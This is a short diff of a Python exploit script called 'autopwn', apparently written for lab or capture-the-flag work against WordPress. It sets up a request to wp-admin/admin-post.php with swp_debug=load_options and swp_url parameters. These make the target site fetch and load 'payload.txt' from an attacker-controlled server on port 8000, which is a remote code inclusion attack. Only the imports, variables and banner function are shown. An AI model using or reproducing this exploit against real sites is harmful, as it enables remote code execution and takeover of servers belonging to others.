@@ -1,19 +1,13 @@
 #!/usr/bin/python3
 
-from http.client import HTTP_PORT
-from time import process_time_ns
-from turtle import ht
 import requests
-import re
 import pyfiglet
 from colorama import Fore, Back, Style
-import http.server
-import socketserver
 
 # change this
-rhost = "192.168.49.158"
+http_ip = "192.168.49.158"
 http_port = 8000
-url = "http://192.168.158.123/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://{0}:{1}/payload.txt".format(rhost,http_port)
+url = "http://192.168.158.123/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://{0}:{1}/payload.txt".format(http_ip,http_port)
 
 def banner(text="autopwn"):
     print(Fore.YELLOW + pyfiglet.figlet_format(text, font="banner"))
